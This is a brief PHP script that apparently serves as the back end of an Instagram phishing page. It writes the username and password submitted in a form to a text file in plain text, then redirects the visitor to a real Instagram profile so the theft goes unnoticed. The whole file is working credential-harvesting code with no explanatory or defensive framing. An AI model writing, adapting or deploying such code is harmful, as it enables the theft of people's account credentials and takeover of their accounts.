<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.instagram.com/engne_ishtapetto/?igsh=OGc1Y25iZXJ1amkx# ');
exit();
?>
